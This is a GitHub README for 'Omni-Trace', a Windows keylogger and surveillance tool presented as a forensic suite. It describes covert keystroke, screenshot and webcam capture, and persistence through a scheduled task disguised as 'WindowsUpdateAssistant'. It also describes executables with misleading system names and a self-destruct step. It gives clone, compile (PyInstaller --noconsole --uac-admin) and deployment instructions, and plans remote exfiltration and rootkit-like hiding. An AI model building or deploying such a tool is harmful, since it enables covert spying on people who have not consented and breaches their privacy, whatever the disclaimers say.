# Omni-Trace Forensic Suite (V1.0)

![Python Version](https://img.shields.io/badge/python-3.13-blue.svg)
![License](https://img.shields.io/badge/license-MIT-green.svg)
![Platform](https://img.shields.io/badge/platform-Windows-lightgrey.svg)

> **⚠️ DISCLAIMER: FOR EDUCATIONAL AND AUTHORIZED USE ONLY**  
> This tool is designed for **legitimate forensic investigations, penetration testing, and authorized security auditing**. Unauthorized deployment constitutes illegal surveillance and violates privacy laws in most jurisdictions. Use only on systems you own or have explicit written permission to test.

---

## 📋 Overview

Omni-Trace is a modular Windows-based forensic monitoring suite designed for covert activity logging and automated evidence collection. It operates as a "Ghost" application—running silently in the background without a GUI, console window, or system notifications. The suite is built for security researchers, forensic analysts, and authorized penetration testers who need detailed system activity logs during investigations.

![Omni-Trace Thumbnail](OmniTrace_Project_thumbnail.png)

## ✨ Features

### **Core Monitoring**
- **Keystroke Logging with Context Tracking**: Captures all keyboard input and uses `win32gui`/`win32process` to log the active window title and process ID for context.
- **Process & Window Monitoring**: Tracks application lifecycle (Open/Minimized/Closed) with precise "Duration of Use" calculation.
- **Visual Forensics**: Automated screenshot and webcam capture at configurable intervals.
- **USB Device Detection**: Placeholder for monitoring removable storage connections.

### **Stealth & Persistence**
- **Zero UI Operation**: No console, tray icon, or system notifications.
- **Windows Task Scheduler Integration**: Automatically starts at user login via the `persist.py` setup tool.
- **Hidden Storage**: Uses `%LOCALAPPDATA%\SystemConfig\` (system-level directory).
- **Low Resource Usage**: Designed for minimal CPU and memory footprint.
- **Self-Destruct Mechanism**: The `clean_up.py` module can optionally delete itself after securing evidence, leaving no trace on the host system.

### **Forensic Integrity**
- **Timestamped Events**: All logs include precise timestamps for chronological reconstruction.
- **AES-256 Encryption**: Secure evidence archiving with password protection using `pyzipper`.
- **Automatic Cleanup**: Built-in function to remove logs older than a configurable retention period.
- **Structured Output**: Organized folder hierarchy by date and hour for easy analysis.

## 🏗️ Technical Architecture

### **Component Diagram**
```
┌─────────────────────────────────────────────────────────┐
│                    Omni-Trace Suite                      │
├─────────────────────────────────────────────────────────┤
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐     │
│  │  The Ghost  │  │  Persister  │  │  Cleaner    │     │
│  │  (Logger)   │  │  (Setup)    │  │  (Harvest)  │     │
│  └──────┬──────┘  └──────┬──────┘  └──────┬──────┘     │
│         │                 │                 │           │
├─────────┼─────────────────┼─────────────────┼───────────┤
│         ▼                 ▼                 ▼           │
│  ┌───────────────────────────────────────────────────┐  │
│  │            Core Engine (OmniTraceBase)            │  │
│  └───────────────────────────────────────────────────┘  │
│         │                 │                 │           │
│         ▼                 ▼                 ▼           │
│  ┌──────────┐    ┌──────────┐    ┌──────────────────┐  │
│  │ Sensors  │    │ Visuals  │    │ Evidence Handler │  │
│  │(Keyboard)│    │(Screen/  │    │ (Encryption/     │  │
│  │(Process) │    │ Camera)  │    │  Compression)    │  │
│  └──────────┘    └──────────┘    └──────────────────┘  │
└─────────────────────────────────────────────────────────┘
```

### **Data Flow**
1. **Initialization**: `persist.py` creates a Task Scheduler entry named "WindowsUpdateAssistant" for automatic startup.
2. **Monitoring**: The main engine (`main.py`) initializes and runs with three parallel threads:
   - Sensor thread (keystrokes + process monitoring via `sensors.py`)
   - Visual thread (screenshots + webcam via `visuals.py`)
   - Maintenance thread (optional auto-cleanup)
3. **Storage**: All data is saved to an encrypted local storage structure with hourly organization (`engine.py`).
4. **Harvesting**: `clean_up.py` stops the logger, removes persistence, aggregates all data into an AES-encrypted ZIP, wipes the source directory, and can self-destruct.

### **File Structure**
```
%LOCALAPPDATA%\SystemConfig\
├── 2025-03-15\
│   ├── 14-00\
│   │   ├── Logs\
│   │   │   └── activity_log.txt
│   │   ├── Screenshots\
│   │   │   ├── SS_00_00.jpg
│   │   │   └── SS_00_30.jpg
│   │   └── Webcam\
│   │       └── CAM_00_00.jpg
│   └── 15-00\
│       └── ...
└── 2025-03-16\
    └── ...
```

## 🚀 Installation & Compilation

### **Prerequisites**
- Windows 10/11
- Python 3.13+
- Administrative privileges (for persistence setup)

### **Dependencies**
Install all required libraries from the provided `requirements.txt`:
```bash
pip install -r requirements.txt
```
**Key Dependencies**: `pynput`, `pywin32`, `mss`, `opencv-python`, `plyer`, `pyzipper`, `psutil`

### **Step 1: Clone and Prepare**
```bash
git clone https://github.com/mabbasdev/omni-trace.git
cd omni-trace
pip install -r requirements.txt
```

### **Step 2: Configuration**
Edit configuration files as needed (e.g., adjust intervals in `visuals.py`, enable auto-cleanup in `engine.py`).

### **Step 3: Compile with PyInstaller**
Create standalone executables for deployment. **Crucially include `--uac-admin` and hidden imports.**

**A. The Ghost (Monitoring Engine)**
```bash
pyinstaller --onefile --noconsole --uac-admin --hidden-import=pyzipper --hidden-import=psutil --name WinSystemHost --icon=ghost.ico main.py
```

**B. The Persister (Setup Tool)**
```bash
pyinstaller --onefile --noconsole --uac-admin --name SystemSetup --icon=setup.ico persist.py
```

**C. The Cleaner (Evidence Harvest)**
```bash
pyinstaller --onefile --noconsole --uac-admin --hidden-import=pyzipper --hidden-import=psutil --name SystemCleaner --icon=clean.ico clean_up.py
```

### **Step 4: Deployment**
1. Run `SystemSetup.exe` as Administrator to create the Task Scheduler persistence.
2. `WinSystemHost.exe` will automatically start on the next user login.
3. Use `SystemCleaner.exe` to stop monitoring, collect, encrypt, and securely remove all evidence.

## 🔧 Configuration Options

### **Monitoring Intervals** (`visuals.py`)
```python
# Screenshot frequency (seconds)
SCREENSHOT_INTERVAL = 30

# Webcam frequency (seconds)
WEBCAM_INTERVAL = 300
```

### **Storage Management** (`engine.py`)
```python
# Uncomment and adjust for auto-cleanup
# core.auto_cleanup(days_to_keep=3)  # Retention period
```

### **Encryption Settings** (`clean_up.py`)
```python
# AES-256 encryption password (default is '123' - CHANGE THIS)
password = b"your_secure_password_here"
```

## 📊 Forensic Output

### **Log File Format** (`activity_log.txt`)
```
[2025-03-15 14:05:32] [SWITCHED TO / FOCUS BACK]: Document - WordPad (wordpad.exe)
[2025-03-15 14:05:33] h
[2025-03-15 14:05:33] e
[2025-03-15 14:05:33] l
[2025-03-15 14:05:33] l
[2025-03-15 14:05:33] o
[2025-03-15 14:05:35] [ENTER]
[2025-03-15 14:05:42] [MINIMIZED / LOST FOCUS]: Document - WordPad (Used for 10.5s)
[2025-03-15 14:05:42] [SWITCHED TO / FOCUS BACK]: Command Prompt (cmd.exe)
```

### **Evidence Archive Structure**
```
Final_Evidence_20250315_1405.zip (AES-256 Encrypted)
└── SystemConfig/
    ├── 2025-03-15/
    │   ├── 14-00/
    │   │   ├── Logs/
    │   │   ├── Screenshots/
    │   │   └── Webcam/
    │   └── 15-00/
    └── 2025-03-16/
```

## ⚠️ Legal & Ethical Compliance

### **Required Authorization**
- Written consent from system owner
- Corporate policy compliance verification
- Legal counsel review for jurisdiction compliance
- Data handling protocol documentation

### **Usage Restrictions**
1. **DO NOT** deploy on systems you dont own or have explicit permission to test.
2. **DO NOT** use for personal surveillance or unauthorized monitoring.
3. **DO** inform all affected parties about monitoring activities.
4. **DO** implement data retention and deletion policies.
5. **DO** secure collected evidence with strong encryption (change the default password).

### **Regulatory Considerations**
- **GDPR (EU)**: Requires explicit consent and data protection.
- **CFAA (US)**: Prohibits unauthorized computer access.
- **ECPA (US)**: Regulates electronic communications interception.
- **Local Privacy Laws**: Comply with all applicable workplace monitoring and privacy regulations.

## 🔮 Roadmap (v2.0)

### **Planned Features**
- **Remote Exfiltration**: Secure delivery via encrypted channels.
- **Real-time Encryption**: XOR/AES encryption of logs before disk write.
- **Trigger-Based Capture**: Increased monitoring on detection of specific keywords or applications.
- **Network Monitoring**: Captured packet analysis and connection logging.
- **Enhanced Stealth**: Rootkit-like hiding mechanisms, anti-debugging, and dynamic configuration.

## 🤝 Contributing

We welcome contributions from security researchers and developers. Please:
1. Fork the repository.
2. Create a feature branch.
3. Add tests for new functionality.
4. Submit a pull request with a detailed description.

## 📄 License

MIT License - See [LICENSE](LICENSE) file for details.

## 🆘 Support

For technical issues or security concerns:
- Open an Issue on GitHub.
- **For responsible disclosure**: Please use encrypted communication.

---

**Remember**: With great power comes great responsibility. Use Omni-Trace ethically, legally, and only for authorized purposes.
